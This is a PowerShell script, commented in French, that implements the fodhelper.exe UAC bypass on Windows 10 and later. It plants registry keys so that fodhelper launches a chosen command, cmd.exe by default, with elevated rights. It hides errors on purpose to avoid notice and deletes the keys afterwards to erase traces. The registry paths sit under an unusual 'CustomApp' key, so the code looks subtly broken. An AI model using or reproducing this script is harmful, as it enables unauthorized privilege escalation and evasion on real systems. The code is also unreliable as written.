function Check-System {
    # Vérifie si le système est Windows 10 ou supérieur.
    $osVersion = [System.Environment]::OSVersion.Version
    if ($osVersion.Major -ge 10) {
        return $true
    } else {
        return $false
    }
}

function Bypass {
    Param (
        [String]$program = "cmd /c start cmd.exe"
    )

    if (-not (Check-System)) {
        Write-Error "Unsupported system detected."
        return
    }

    try {
        # Emplacement alternatif pour les clés de registre
        $regPath1 = "HKCU:\Software\CustomApp\.pwn\Shell\Open\command"
        $regPath2 = "HKCU:\Software\CustomApp\ms-settings\CurVer"

        # Supprime les clés existantes avant de créer de nouvelles pour éviter les conflits.
        Remove-Item -Path $regPath1 -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $regPath2 -Recurse -Force -ErrorAction SilentlyContinue

        # Crée les nouvelles clés et définit les valeurs.
        New-Item -Path $regPath1 -Force | Out-Null
        Set-ItemProperty -Path $regPath1 -Name "(default)" -Value $program -Force

        New-Item -Path $regPath2 -Force | Out-Null
        Set-ItemProperty -Path $regPath2 -Name "(default)" -Value ".pwn" -Force

        # Lance fodhelper.exe pour déclencher le contournement UAC.
        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue

        # Attends un court instant pour permettre l'exécution.
        Start-Sleep -Seconds 3
    }
    catch {
        # Ne pas afficher explicitement l'erreur pour éviter d'attirer l'attention.
        return
    }
    finally {
        # Nettoie les clés de registre créées pour éviter toute trace persistante.
        Remove-Item -Path "HKCU:\Software\CustomApp\" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Exécute la fonction
Bypass
